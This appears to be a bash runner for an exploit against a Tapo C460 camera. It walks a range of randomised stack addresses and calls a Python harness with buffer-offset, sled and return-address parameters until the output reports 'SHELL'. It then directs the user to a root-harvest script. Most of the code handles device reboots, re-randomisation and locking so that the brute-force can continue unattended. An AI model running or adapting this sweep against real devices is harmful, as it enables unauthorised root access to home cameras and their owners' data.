#!/bin/bash
# C460 stack sweep runner with reboot detection.
#
# The walk is a coverage problem over a randomised region (mmap_base = 0xb7000000 - up to 1 MB), so
# a reboot invalidates it: the kernel re-randomises, and continuing from where we stopped walks a
# range that no longer means anything. The unit also reboots on its own (PIR wake, watchdog), so the
# runner samples presence every step, records the uptime pattern, and restarts from the top when it
# sees present -> absent -> present.
#
# Guard rules hold: nothing is sent while the unit is absent.
#
#   ./tapo_sweep_run.sh                       # defaults: .4.33, 0xb7000000 down to 0xb6f00000
#   START=0xb6ff0000 STEP=0x100 ./tapo_sweep_run.sh
#
# Exit: 0 shell found · 1 range exhausted · 2 unit never returned
set -u
HOST="${HOST:-192.168.4.33}"
MAC="${MAC:-50:3d:d1:e3:e2:07}"
START="${START:-0xb7000000}"
END="${END:-0xb6f00000}"
STEP="${STEP:-0x400}"
SETTLE="${SETTLE:-18}"          # between guesses; the DS needs it after a crash
GAP_S="${GAP_S:-25}"            # an absence longer than this is a reboot, not a slow reply
MAX_WAIT="${MAX_WAIT:-900}"     # give up waiting for a return after this many seconds
LOG="${LOG:-/tmp/c460_sweep.log}"
UPTIME="${UPTIME:-${LOG%.log}.uptime}"
HERE="$(cd "$(dirname "$0")" && pwd)"
# overridable so the orchestration can be tested without a device
ARP_CMD="${ARP_CMD:-sudo -n /usr/sbin/arp}"
PING_CMD="${PING_CMD:-ping}"
HARNESS="${HARNESS:-$HERE/tapo_connectap_sc.py}"

log() { printf '%s %s\n' "$(date +%H:%M:%S)" "$*" | tee -a "$LOG"; }

# One sweeper per unit: the DS rate-limits a second client (-40401) and the login then retries for
# minutes, which looks like a dead unit. A directory is the lock (atomic, no flock on macOS).
LOCK="${LOCK:-/tmp/.tapo_sweep.$HOST.lock}"
if ! mkdir "$LOCK" 2>/dev/null; then
  holder=$(cat "$LOCK/pid" 2>/dev/null)
  if [ -n "$holder" ] && kill -0 "$holder" 2>/dev/null; then
    echo "another sweep is running on $HOST (pid $holder) — stop it first" >&2
    exit 5
  fi
  rm -rf "$LOCK"; mkdir "$LOCK"
fi
echo $$ > "$LOCK/pid"
trap 'rm -rf "$LOCK"' EXIT
norm_mac() { echo "$1" | tr A-F a-f | awk -F: '{ for (i = 1; i <= NF; i++) $i = $i + 0; print }' OFS=:; }

present() {
  $ARP_CMD -an 2>/dev/null | awk -v ip="$HOST" -v m="$(norm_mac "$MAC")" '
    { gsub(/[()]/, "", $2); if ($2 != ip) next
      n = split($4, o, ":"); out = ""
      for (i = 1; i <= n; i++) out = out (i > 1 ? ":" : "") (o[i] + 0)
      if (out == m) { found = 1 } }
    END { exit !found }' || return 1
  RTT=$($PING_CMD -c 1 -W 700 "$HOST" 2>/dev/null | awk -F'time=' '/time=/{print $2; exit}')
  return 0
}

# One sample per call, appended to the uptime pattern log. This is the only presence check in the
# loop, so it must do the full check itself (arp + ICMP) rather than read a cached verdict.
sample() {
  local t
  t=$(date +%H:%M:%S)
  if present; then
    printf '%s present icmp=%s rtt=%s\n' "$t" "$([ -n "${RTT:-}" ] && echo yes || echo no)" "${RTT:-?}" >> "$UPTIME"
    return 0
  fi
  printf '%s absent\n' "$t" >> "$UPTIME"
  return 1
}

wait_return() { # bounded; returns 0 when the unit is back
  local t0=$SECONDS
  while [ $((SECONDS - t0)) -lt "$MAX_WAIT" ]; do
    if sample; then return 0; fi
    sleep 5
  done
  return 1
}

reboots=0
addr=$((START))
end=$((END))
step=$((STEP))
log "sweep $HOST 0x$(printf %x "$addr") down to 0x$(printf %x "$end") step 0x$(printf %x "$step")"
log "uptime pattern -> $UPTIME"

while [ "$addr" -gt "$end" ]; do
  if ! sample; then
    log "ABSENT at 0x$(printf %x "$addr") — holding, nothing sent"
    if ! wait_return; then
      log "unit did not return within ${MAX_WAIT}s — stopping"
      exit 2
    fi
    reboots=$((reboots + 1))
    addr=$((START))
    log "REBOOT detected (absence) — restarting from 0x$(printf %x "$addr")"
    continue
  fi

  t0=$SECONDS
  out=$(sudo -n python3 "$HARNESS" guard --host "$HOST" \
    --offset 1060 --sled 0 --padpc 1 --sledfill --pcround 0x1000 \
    --addr "$(printf 0x%x "$addr")" --count 1 --step "$(printf 0x%x "$step")" \
    --hang --mac "$MAC" --guard-deadline 3 2>&1)
  took=$((SECONDS - t0))
  log "addr=0x$(printf %x "$addr") :: ${took}s $(echo "$out" | tail -2 | tr '\n' ' ' | cut -c1-140)"

  if echo "$out" | grep -q "SHELL"; then
    log "SHELL at 0x$(printf %x "$addr") — run tapo_root_harvest.sh"
    exit 0
  fi

  # A step that took far longer than the settle time, or an absence right after it, is a reboot.
  if [ "$took" -gt "$GAP_S" ]; then
    log "step took ${took}s (> ${GAP_S}s) — treating as reboot"
    reboots=$((reboots + 1))
    addr=$((START))
    continue
  fi

  addr=$((addr - step))
  sleep "$SETTLE"
done

log "range exhausted, $reboots reboot(s) — analyse with tapo_sweep_analyzer.py $LOG"
exit 1
